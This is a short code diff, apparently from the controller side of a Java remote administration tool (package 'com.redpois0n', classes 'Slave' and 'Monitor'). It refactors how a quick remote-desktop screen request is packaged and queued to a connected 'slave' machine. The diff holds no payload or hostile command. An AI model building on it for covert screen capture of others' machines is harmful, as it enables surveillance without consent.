@@ -26,8 +26,7 @@ import javax.swing.border.EmptyBorder;
 
 import com.redpois0n.Monitor;
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet98QuickDesktop;
 import com.redpois0n.threads.ThreadFPS;
 
 @SuppressWarnings("serial")
@@ -195,7 +194,7 @@ public class FrameQuickRemoteScreen extends BaseFrame {
 	}
 
 	public void send() {
-		slave.addToSendQueue(new PacketBuilder(OutgoingHeader.QUICK_DESKTOP, new Object[] { image.getWidth(), image.getHeight(), getMonitor() }));
+		slave.addToSendQueue(new Packet98QuickDesktop(image.getWidth(), image.getHeight(), getMonitor()));
 	}
 
 	public ThreadFPS getFPSThread() {
